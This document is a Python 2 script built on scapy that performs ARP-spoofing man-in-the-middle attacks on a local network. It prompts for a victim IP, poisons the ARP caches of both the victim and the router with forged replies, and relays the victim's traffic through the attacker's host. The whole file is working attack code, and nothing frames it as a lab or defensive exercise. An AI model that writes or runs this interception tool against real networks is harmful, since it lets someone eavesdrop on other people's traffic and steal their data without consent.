from scapy.all import *
import subprocess
import sys

#to get MAC address
def getMAC(IP):
	answer, unanswer = arping(IP)
	#s = source mac / r = route mac
	for s, r in answer:
		return r[Ether].src

#to send fake ARP information
def Spoof(routerIP, victimIP):
	send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
	send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))

#to modify the packet
def Modify(pkt):
	#Spoofing if the packet is ARP
	if pkt.haslayer(ARP) == 1:
		Spoof(routerIP, victimIP)
		print 'ARP Spoof'
	#Relaying if the packet is not ARP
	else:
		if pkt[IP].dst == victimIP:
			pkt[Ether].src = attackerMAC
			pkt[Ether].dst = victimMAC
			if pkt.haslayer(UDP) == 1:
				del pkt[UDP].chksum
				del pkt[UDP].len
			del pkt.chksum
			del pkt.len
			sendp(pkt)
			print 'DST : router -> victim'

		if pkt[IP].src == victimIP:
			pkt[Ether].src = attackerMAC
			pkt[Ether].dst = routerMAC
			if pkt.haslayer(UDP) == 1:
				del pkt[UDP].chksum
				del pkt[UDP].len
			del pkt.chksum
			del pkt.len
			sendp(pkt)
			print 'SRC : victim -> router'

#to restore arp table by sending MAC address(ff:ff:ff:ff:ff:ff)
def Restore(routerIP, victimIP):
	send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = 'ff:ff:ff:ff:ff:ff'))
	send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = 'ff:ff:ff:ff:ff:ff'))

#to get router IP & MAC
route = subprocess.check_output('route')
routerIP = route[route.find('192') : route.find('192') + 16]
routerIP = routerIP[0 : routerIP.find(' ')]
routerMAC = getMAC(routerIP)

#to get victim IP & MAC
victimIP = raw_input("victimIP: ")
victimMAC = getMAC(victimIP)

#to get attacker IP & MAC
attacker = subprocess.check_output('ifconfig')
attackerIP = attacker[attacker.find('192') : attacker.find('192') + 16]
attackerIP = attackerIP[0 : attackerIP.find(' ')]
attackerMAC = attacker[attacker.find('HWaddr ') + 7 : attacker.find('HWaddr ') + 24]

#printing the collected information
print routerIP
print routerMAC
print victimIP
print victimMAC
print attackerIP
print attackerMAC

#Sniff the packet unless KeyboardInterrupt
while 1:
	try:
		sniff(prn = Modify, filter="host "+victimIP+" or host "+routerIP, count = 1)
	except KeyboardInterrupt:
		Restore(routerIP, victimIP)
		sys.exit(1)
